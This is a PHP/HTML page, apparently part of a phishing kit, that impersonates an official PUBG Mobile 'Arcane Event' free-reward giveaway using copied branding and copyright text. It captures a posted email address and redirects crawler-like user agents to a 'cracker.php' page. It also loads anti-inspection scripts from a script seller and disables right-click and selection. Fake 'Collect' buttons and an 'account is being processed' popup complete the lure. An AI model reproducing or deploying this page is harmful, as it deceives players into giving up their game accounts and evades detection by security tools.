<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<script src="https://jefanya.store/js/ctrlu.js"></script>
<script src="https://jefanya.store/js/debug.js"></script> <!-- Biar Ga di Maling Sama Orang Script nya --> 
<!-- Isinya Alert Suruh Beli SCript Di Jefanya Store Coba aja CTRL + U -->
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE ARCANE EVENT">
<meta name="description" content="Collect your special rewards at the PUBG MOBILE ARCANE EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the PUBG MOBILE ARCANE EVENT. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE ARCANE EVENT">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<title>PUBG MOBILE ARCANE EVENT</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/log/tanfc.css">
<link rel="stylesheet" href="css/log/tantw.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
	@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'pubgFont'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/pubg.woff2) format("woff2"), 
        url(fonts/pubg.woff) format("woff"),
        url(fonts/pubg.ttf) format("truetype");
}
body {
	background:black;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url(img/bg.jpg) no-repeat center center;
	background-size: 100% 100%;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 0px solid #01F2FF;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
}
.navbar img {
	width:41;
	margin-right:5px;
	border-radius:5px;
	float:left;
}
.navbar-txt-game {
	padding-top:2px;
	color:#feab02;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
}
.navbar-txt-game span {
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:5px;
	float:right;
}
.navbar-btn-wrapper i {
	margin-left:5px;
	font-size:38px;
	color:#d9d9d8;
	line-height:31px;
	float:right;
}
.navbar-btn {
	background:#eaa300;
	width:70px;
	height:auto;
	margin:2px;
	padding:2px;
	color:#000;
	font-size:15px;
	font-family:'Teko',sans-serif;
	text-align:center;
	text-transform:uppercase;
	border:1px solid #ffcc57;
	display:inline-block;
	outline:none;
}
.header {
    width: 100%;
    height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.header video {
	width: 100%;
}
.landing {
	width:100%;
	height:auto;
}
.alert {
	background: url(img/alatselow/alert.png) no-repeat center;
	background-size: 100% 100%;
	width: 100%;
	height: 83px;
	margin-top: 25px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	border-top: 2px solid #98CAF4;
	border-bottom: 2px solid #98CAF4;
	display: block;
}
.alert img {
	width: 65px;
	height: 75px;
	margin: 5px;
	margin-top: 10px;
	margin-left: 10px;
	float: right;
}
.season-img {
	background:url('img/alatselow/alert.png') no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	height: 70px;
	margin-top: 27px;
	margin-left: 0px;
	margin-right: 0px;
	display: block;
}
.season-alert {
	background:url('img/alatselow/alert2.png') no-repeat center center;
	box-shadow: #fffafa;
	background-size: 100% 100%;
	width:98%;
	height: auto;
	margin-left:auto;
	margin-right:auto;
	padding:13px;
	display:block;
}
.season-alert-title {
	color: #01F2FF;
	font-size: 18px;
	font-family: pubgFont;
	font-weight: 500;
	text-align: center;
}
.seasons-alert {
	background:url(img/alert.jpg) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height: 40px;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.seasons-alert-img {
	width: 45px;
	height: auto;
	margin-top: 3px;
	margin-left: 8px;
	float: left;
}
.seasons-alert-title {
	width: auto;
	height: auto;
	margin-left: 44px;
	padding-top: 17px;
	color: #fff;
	font-size: 20px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	display: inline-block;
}
.seasons-alert-desc {
	width: auto;
	height: auto;
	margin-left: 38px;
	padding-top: 17px;
	color: #fff;
	font-size: 20px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	display: inline-block;
}
.event-wrapper {
	width: 100%;
	margin-bottom:100%;
	padding: 10px;
}
.event-wrapper img:nth-child(1) {
	width: 130px;
	float: right;
}
.event-notify {
	background-color:rgba(0, 0, 0, 0.8);
	width:100%;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	padding: 8px;
	display:block;
}
.event-notify-title {
	padding-bottom:10px;
	color:#fff;
	font-size:17px;
	font-family:pubgFont;
	text-align:left;
	text-decoration:underline;
}
.event-notify-content {
	color:#fff;
	font-size:16px;
	font-family:pubgFont;
	text-align:left;
	line-height:18px;
}
.event-btn {
	background:transparent;
	width:auto;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:15px;
	padding:7px;
	padding-left:15px;
	padding-right:15px;
	color:#eaa300;
	font-size:17px;
	font-family:pubgFont;
	text-align:center;
	border:1px solid #eaa300;
	outline:none;
	display:block;
}
.box {
    width: 95%;
    height: auto;
	margin-top: 12px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
	display: block;
}
.event-alert {
	background:url(img/popup1.png) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height: 55px;
	margin-left:auto;
	margin-right:auto;
	padding:5px;
	display:block;
	border-radius: 4px;
}
.event-alert span{
	position: absolute;
	top: 5.5%;
	right: 7%;
	width: auto;
	color:white;
}
.event-alert-title {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 17px;
	font-family: pubgFont;
	text-align: center;
}
.event-alert-desc {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 16px;
	font-family: pubgFont;
	text-align: center;
	line-height: 15px;
}
.menu-wrapper-border {
	height: 11px;
}
.menu-wrapper {
	width: 40%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 5px;
	display: block;
}
.menu-content {
	background:url(img/popup1.png) no-repeat center center;background-size:100% 100%;
	width: auto;
	height: auto;
	padding: 7px;
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 12px;
	font-family:pubgFont;
	text-align: center;
	border: none;
	cursor: pointer;
}
.menu-content-active {
	background:url(img/menu_off.png) no-repeat center center;
	background-size:100% 100%;
	color: #fff;
}
.scroll {
	overflow:scroll;
	position:relative;
	width: 100%;
	height:300px;
	margin-top:11px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}
.item {
	width: 30%;
	height: 100px;
	margin: 3px;
	margin-bottom: 38px;
	display: inline-block;
}
.item img {
	width: 100%;
    height: 110%;
}
.item button {
	background:url(img/bg_cratebtn1.png) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height:auto;
	padding:3px;
	margin-top:10px;
	color:#000;
	font-size:18px;
	font-family:pubgFont;
	font-weight: 500;
	text-align:center;
	border: none;
	outline:none;
}
.item img {
	border:1px solid #B7D2DB;
}
.footer {
	background:#000;
	width: 100%;
	height: auto;
	padding: 10px;
}
.footer-txt-follow {
	margin-top: 13px;
	margin-bottom: 5px;
	color: #7C7C7C;
	font-size: 14px;
	font-family:followFont;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
}
.footer-follow-icon {
	width: 49px;
	height: 49px;
	margin: 5px;
	display: inline-block;
}
.footer-txt-copyright {
	color: #7C7C7C;
	font-size: 13px;
	font-family:textFont;
	text-align: center;
}
.footer-copyright-icon {
	width: 74%;
	margin-top: 8px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	display: block;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'Teko';
	color:#000;
}
.nav-popup {
	background:url(img/popup-navbar.png) no-repeat center center;
	background-size:100% 100%;
	height: auto;
	padding-top: 5px;
	padding-bottom: 5px;
}
.nav-popup-title {
	padding-left: 13px;
	color: #000;
	font-size: 22px;
	font-family:pubgFont;
	font-weight: 500;
	text-align: left;
}
.popup-box-bg {
	background:url(img/popup-box-bg.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -10px;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #000;
	font-size: 20px;
    font-family:pubgFont;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	border: 1px solid #213043;
	display: block;
}
.popup-footer {
	background:url(img/popup-footer.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 50px;
}
.popup-footer button {
	width: auto;
	height: auto;
	margin-top: 8px;
	padding: 5px;
	padding-left: 40px;
	padding-right: 40px;
	color: #151e2d;
	font-size:18px;
	font-family:pubgFont;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-footer-deactive {
	background: url(img/btn-off.png) no-repeat center;
	background-size: 80% 90%;
	margin-left: 10%;
	float: left;
}
.popup-footer-active {
	background: url(img/btn-on.png) no-repeat center;
	background-size: 80% 90%;
	margin-right: 10%;
	float: right;
}
.btn-login {
    width: 88%;
    height: auto;
    padding: 8px;
    margin-left: auto;
	margin-right: auto;
    color: #000;
	font-size: 15px;
    font-family: Teko;
    border: none;
    border-radius: 3px;
    outline: none;
    display: block;
}
.btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.facebook {
    background: #3b5998;
    color: #fff;
	margin-top: 20px;
	margin-bottom: 3px;
}
.twitter {
    background: #08a0e9;
    color: #fff;
	margin-bottom: 10px;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:345px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.verify-input {
	background: #dfedf975;
	background-size: 100% 100%;
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	color: #fff;
	font-size:15px;
	font-family:pubgFont;
	border-top: 0.5px solid white;
	border-bottom: 0.5px solid white;
	border-right: 2px solid white;
	border-left: 2px solid white;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: #dfedf975;
	background-size: 100% 100%;
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 3px;
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	border-top: 0.5px solid white;
	border-bottom: 0.5px solid white;
	border-right: 2px solid white;
	border-left: 2px solid white;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-btn {
    background: url(img/menu_off.png) no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: auto;
	margin-top: -10px;
	padding: -10px;
	font-size: 15px;
	font-family:pubgFont;
	text-align: center;
	color: #fff;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
	.item div {
    width: 100%;
    height: 100%;
    border-radius: 3px 3px 0px 0px;
	}
	.item div:first-child {
	    margin-left: 0;
	}

	figure {
    margin: 0;
    padding: 0;
    overflow: hidden;
	}
	.selowbosque figure {
    position: relative;
	}
	.selowbosque figure::before {
	    position: absolute;
	    top: 0;
	    left: -75%;
	    z-index: 2;
	    display: block;
	    content: '';
	    width: 50%;
	    height: 100%;
	    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    -webkit-transform: skewX(-25deg);
	    transform: skewX(-25deg);
	}
	.selowbosque figure::before {
	    -webkit-animation: shine 2s infinite;
	    animation: shine 2s infinite;
	}
	@-webkit-keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
	@keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
@media only screen and (max-width:600px) {
    .container{
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
		border-top:0px solid #57c0ff;
        border-radius: 0px;
        padding: 0px;
    }

	.box {
	    width: 96%;
		height: auto;
	}
    .scroll {
        height: none;
    }
    .item {
        height: 90px;
    }
    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
	.header{
		width: 100%;
		}
}
</style>
<div class="container rewardsBox">
<div class="navbar">
<div class="navbar-btn-wrapper">
<button type="button" class="navbar-btn" onclick="location.href='https://www.pubgmobile.com/pay/';" onmousedown="buka.play();">Purchase</button>
<button type="button" class="navbar-btn" onclick="location.href='https://play.google.com/store/apps/details?id=com.tencent.ig';" onmousedown="buka.play();">Download</button>
</div> <!--- navbar-btn-wrapper --->
<img src="img/alatselow/selowlogo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>OFFICIAL PUBG ON MOBILE</span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
<div class="header">
  <img src="img/header1.jpg" style="width:100%">
</div> <!--- header --->
<div class="seasons-alert">
</div> <!--- seasons-alert --->
<div class="box">
<div class="season-alert">
</div> <!--- season-alert --->
</div>
<div class="tab_rewards" id="latest">
<center>

<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/1.jpg">
</figure>
</div>
<div>
<button src="img/selow/1.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>
<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/2.jpg">
</figure>
</div>
<div>
<button src="img/selow/2.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>
<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/3.jpg">
</figure>
</div>
<div>
<button src="img/selow/3.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>
<p>
<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/4.jpg">
</figure>
</div>
<div>
<button src="img/selow/4.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>
<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/5.jpg">
</figure>
</div>
<div>
<button src="img/selow/5.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>
<div class="item selowbosque">
<div>
<figure>
<img src="img/selow/6.jpg">
</figure>
</div>
<div>
<button src="img/selow/6.jpg" type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);">Collect</button>
</div>
</div>

</center>
<br>
</div> <!--- tab-rewards --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="img/alatselow/selow_1.png">
<img class="footer-follow-icon" src="img/alatselow/selow_2.png">
<img class="footer-follow-icon" src="img/alatselow/selow_3.png">
<img class="footer-follow-icon" src="img/alatselow/selow_4.png">
<img class="footer-follow-icon" src="img/alatselow/selow_5.png">
</center>
<div class="footer-txt-copyright">Partnership Inquiry: pubgmobile_business@tencent.com</div> <!--- footer-txt-copyright --->
<img class="footer-copyright-icon" src="img/alatselow/footer.png">
<div class="footer-txt-copyright">??? 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">??? 2018-2021 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">PROCESSING REWARDS</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thank you for joining this event
<br>
<br>
Your account is being processed
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="submit" onmousedown="tutup.play();" class="popup-footer-active" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/showHide.js"></script>
<script>
var slideIndex = 0;
showSlides();
function showSlides() {
  var i;
  var slides = document.getElementsByClassName("mySlides");
  var dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 2500);
}
</script>
<script>
function open_reward_confirmation(ag) {
    var rewardImg = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myRewardImg').attr('src',rewardImg);
}
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}

// tombol untuk menutup popup
function close_reward_confirmation(){
	$('.reward_confirmation').hide()
}
function close_account_login(){
	$('.account_login').hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
function seseselow2(){
	$('.account_login').hide()
   $('.reward_confirmation').show()
}
</script>
<script src="js/click.js"></script>
<script type="text/javascript">
	$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);

$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#seasonTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script>
</body>
</html>